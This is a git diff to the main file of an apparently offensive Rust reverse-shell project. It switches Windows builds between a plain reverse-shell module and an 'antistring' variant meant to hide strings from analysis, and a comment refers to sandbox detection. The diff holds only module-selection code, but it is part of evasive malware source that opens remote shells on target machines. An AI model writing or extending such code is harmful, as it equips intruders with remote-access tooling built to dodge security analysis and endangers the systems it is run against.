@@ -5,12 +5,14 @@ mod rco_reverse_shell_linux;
 use rco_reverse_shell_linux::shell;
 
 // Load Windows implementation if the target OS is Windows
-#[cfg(windows)]
+#[cfg(all(windows, not(feature = "antistring")))]
 mod rco_reverse_shell_windows;
 #[cfg(all(windows, not(feature = "antistring")))]
 use rco_reverse_shell_windows::shell;
 #[cfg(all(windows, feature = "antistring"))]
-use rco_reverse_shell_windows::antistring_shell as shell;
+mod rco_reverse_shell_windows_antistring;
+#[cfg(all(windows, feature = "antistring"))]
+use rco_reverse_shell_windows_antistring::shell;
 
 fn main() {
     // Runs the sandbox detection function or the dummy replacement, dependent on features
